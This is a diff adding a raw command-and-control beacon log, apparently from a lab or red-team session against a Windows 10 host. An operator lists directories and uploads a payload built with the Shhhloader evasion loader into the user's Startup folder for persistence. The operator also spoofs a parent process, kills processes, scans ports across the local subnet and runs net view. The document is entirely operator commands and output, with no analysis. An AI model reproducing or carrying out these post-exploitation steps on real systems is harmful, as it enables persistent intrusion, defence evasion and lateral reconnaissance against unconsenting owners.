@@ -1,0 +1,140 @@
+01/06 04:03:01 UTC [metadata] 192.168.88.108 <- 192.168.88.108; computer: DESKTOP-29M090E; user: NITRO 5; process: mspaint.exe; pid: 15672; os: Windows; version: 10.0; build: 22621; beacon arch: x64 (x64)
+01/06 04:03:22 UTC [input] <neo> sleep 10
+01/06 04:03:22 UTC [task] <T1029> Tasked beacon to sleep for 10s
+01/06 04:03:32 UTC [input] <neo> ls
+01/06 04:03:32 UTC [task] <> Tasked beacon to list files in .
+01/06 04:03:59 UTC [checkin] host called home, sent: 35 bytes
+01/06 04:03:59 UTC [output]
+C:\Users\NITRO5~1\AppData\Local\Temp\RarSFX11\*
+D	0	01/06/2023 11:01:57	.
+D	0	01/06/2023 11:03:39	..
+F	954368	01/06/2023 08:59:51	a.exe
+F	11898	01/06/2023 08:35:50	Test.docx
+
+
+01/06 04:04:26 UTC [input] <neo> pwd
+01/06 04:04:26 UTC [task] <> Tasked beacon to print working directory
+01/06 04:04:29 UTC [checkin] host called home, sent: 8 bytes
+01/06 04:04:29 UTC [output]
+Current directory is C:\Users\NITRO5~1\AppData\Local\Temp\RarSFX11
+
+01/06 04:04:32 UTC [input] <neo> cd ..
+01/06 04:04:32 UTC [task] <> cd ..
+01/06 04:04:39 UTC [checkin] host called home, sent: 10 bytes
+01/06 04:05:24 UTC [input] <neo> cd ..
+01/06 04:05:24 UTC [task] <> cd ..
+01/06 04:05:25 UTC [input] <neo> cd ..
+01/06 04:05:25 UTC [task] <> cd ..
+01/06 04:05:26 UTC [input] <neo> cd ..
+01/06 04:05:26 UTC [task] <> cd ..
+01/06 04:05:28 UTC [input] <neo> pwd
+01/06 04:05:28 UTC [task] <> Tasked beacon to print working directory
+01/06 04:05:29 UTC [checkin] host called home, sent: 38 bytes
+01/06 04:05:30 UTC [output]
+Current directory is C:\Users\NITRO5~1
+
+01/06 04:05:44 UTC [input] <neo> ls
+01/06 04:05:44 UTC [task] <> Tasked beacon to list files in .
+01/06 04:05:50 UTC [checkin] host called home, sent: 19 bytes
+01/06 04:05:50 UTC [output]
+C:\Users\NITRO5~1\*
+D	0	01/06/2023 00:43:19	.
+D	0	12/23/2022 14:12:25	..
+F	5777	12/23/2022 09:20:40	-1.14-windows.xml
+D	0	12/23/2022 10:20:45	.android
+D	0	12/21/2022 18:19:02	.dotnet
+D	0	12/23/2022 13:52:08	.templateengine
+D	0	12/22/2022 05:24:32	AppData
+D	0	12/22/2022 05:24:32	Application Data
+D	0	12/22/2022 05:24:41	Contacts
+D	0	12/22/2022 05:24:32	Cookies
+D	0	01/02/2023 20:06:32	Desktop
+D	0	01/04/2023 09:55:10	Documents
+D	0	01/06/2023 10:40:13	Downloads
+D	0	12/22/2022 05:24:41	Favorites
+D	0	01/06/2023 00:43:37	IntelGraphicsProfiles
+D	0	12/22/2022 05:24:41	Links
+D	0	12/22/2022 05:24:32	Local Settings
+D	0	12/22/2022 05:24:41	Music
+D	0	12/22/2022 05:24:32	My Documents
+D	0	12/22/2022 05:24:32	NetHood
+F	7077888	01/06/2023 00:43:19	NTUSER.DAT
+F	1718272	12/22/2022 05:24:32	ntuser.dat.LOG1
+F	1814528	12/22/2022 05:24:32	ntuser.dat.LOG2
+F	65536	12/22/2022 05:24:38	NTUSER.DAT{a2332f18-cdbf-11ec-8680-002248483d79}.TM.blf
+F	524288	12/22/2022 05:24:32	NTUSER.DAT{a2332f18-cdbf-11ec-8680-002248483d79}.TMContainer00000000000000000001.regtrans-ms
+F	524288	12/22/2022 05:24:32	NTUSER.DAT{a2332f18-cdbf-11ec-8680-002248483d79}.TMContainer00000000000000000002.regtrans-ms
+F	20	12/22/2022 05:24:32	ntuser.ini
+D	0	12/22/2022 21:59:05	OneDrive
+D	0	12/29/2022 15:15:50	Pictures
+D	0	12/22/2022 05:24:32	PrintHood
+D	0	12/22/2022 05:24:32	Recent
+D	0	12/22/2022 05:24:41	Saved Games
+D	0	12/22/2022 05:26:17	Searches
+D	0	12/22/2022 05:24:32	SendTo
+D	0	12/21/2022 18:36:54	source
+D	0	12/22/2022 05:24:32	Start Menu
+D	0	12/22/2022 05:24:32	Templates
+D	0	12/21/2022 17:06:53	Videos
+
+
+01/06 04:05:56 UTC [input] <neo> sleep 5
+01/06 04:05:56 UTC [task] <T1029> Tasked beacon to sleep for 5s
+01/06 04:06:00 UTC [checkin] host called home, sent: 16 bytes
+01/06 04:06:46 UTC [input] <neo> cd AppData/Roaming/Microsoft/Windows/Start\ Menu/Programs/Startup
+01/06 04:06:46 UTC [task] <> cd AppData/Roaming/Microsoft/Windows/Start\ Menu/Programs/Startup
+01/06 04:06:50 UTC [checkin] host called home, sent: 70 bytes
+01/06 04:06:53 UTC [input] <neo> pwd
+01/06 04:06:53 UTC [task] <> Tasked beacon to print working directory
+01/06 04:06:55 UTC [checkin] host called home, sent: 8 bytes
+01/06 04:06:55 UTC [output]
+Current directory is C:\Users\NITRO5~1
+
+01/06 04:07:11 UTC [input] <neo> cd AppData
+01/06 04:07:11 UTC [task] <> cd AppData
+01/06 04:07:13 UTC [input] <neo> pwd
+01/06 04:07:13 UTC [task] <> Tasked beacon to print working directory
+01/06 04:07:15 UTC [checkin] host called home, sent: 23 bytes
+01/06 04:07:15 UTC [output]
+Current directory is C:\Users\NITRO5~1\AppData
+
+01/06 04:07:21 UTC [input] <neo> cd Roaming
+01/06 04:07:21 UTC [task] <> cd Roaming
+01/06 04:07:25 UTC [checkin] host called home, sent: 15 bytes
+01/06 04:07:30 UTC [checkin] host called home, sent: 19 bytes
+01/06 04:07:45 UTC [checkin] host called home, sent: 61 bytes
+01/06 04:07:50 UTC [checkin] host called home, sent: 69 bytes
+01/06 04:08:00 UTC [checkin] host called home, sent: 80 bytes
+01/06 04:08:05 UTC [checkin] host called home, sent: 89 bytes
+01/06 04:08:10 UTC [checkin] host called home, sent: 97 bytes
+01/06 04:08:27 UTC [input] <neo> upload /home/kali/Desktop/Shhhloader/a.exe (C:\Users\NITRO5~1\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\a.exe)
+01/06 04:08:30 UTC [task] <> Tasked beacon to upload /home/kali/Desktop/Shhhloader/a.exe as C:\Users\NITRO5~1\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\a.exe
+01/06 04:08:30 UTC [indicator] file: 844fb84e402f77cd3b1e68ca58e86366 1216512 bytes C:\Users\NITRO5~1\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\a.exe
+01/06 04:08:31 UTC [checkin] host called home, sent: 1046722 bytes
+01/06 04:08:36 UTC [checkin] host called home, sent: 170178 bytes
+01/06 04:18:24 UTC [checkin] host called home, sent: 74 bytes
+01/06 04:18:29 UTC [checkin] host called home, sent: 80 bytes
+01/06 04:20:35 UTC [checkin] host called home, sent: 12 bytes
+01/06 04:21:04 UTC [input] <neo> desktop
+01/06 04:21:05 UTC [checkin] host called home, sent: 16 bytes
+01/06 04:21:25 UTC [checkin] host called home, sent: 19 bytes
+01/06 04:21:33 UTC [checkin] host called home, sent: 61 bytes
+01/06 04:21:48 UTC [checkin] host called home, sent: 69 bytes
+01/06 04:21:50 UTC [checkin] host called home, sent: 80 bytes
+01/06 04:21:52 UTC [checkin] host called home, sent: 89 bytes
+01/06 04:21:53 UTC [checkin] host called home, sent: 97 bytes
+01/06 04:22:04 UTC [checkin] host called home, sent: 12 bytes
+01/06 04:23:45 UTC [input] <neo> ppid 15672
+01/06 04:23:45 UTC [task] <T1059, T1093, T1106> Tasked beacon to spoof 15672 as parent process
+01/06 04:23:45 UTC [checkin] host called home, sent: 12 bytes
+01/06 04:24:14 UTC [input] <neo> kill 14452
+01/06 04:24:14 UTC [task] <> Tasked beacon to kill 14452
+01/06 04:24:14 UTC [checkin] host called home, sent: 36 bytes
+01/06 04:24:45 UTC [input] <neo> kill 7596
+01/06 04:24:45 UTC [task] <> Tasked beacon to kill 7596
+01/06 04:24:45 UTC [checkin] host called home, sent: 36 bytes
+01/06 04:26:38 UTC [checkin] host called home, sent: 1522 bytes
+01/06 04:27:05 UTC [input] <neo> portscan 192.168.88.0-192.168.88.255 1-1024,3389,5000-6000 arp 1024
+01/06 04:27:05 UTC [task] <T1046, T1093> Tasked beacon to scan ports 1-1024,3389,5000-6000 on 192.168.88.0-192.168.88.255
+01/06 04:27:05 UTC [checkin] host called home, sent: 93285 bytes
+01/06 04:27:31 UTC [input] <neo> net view
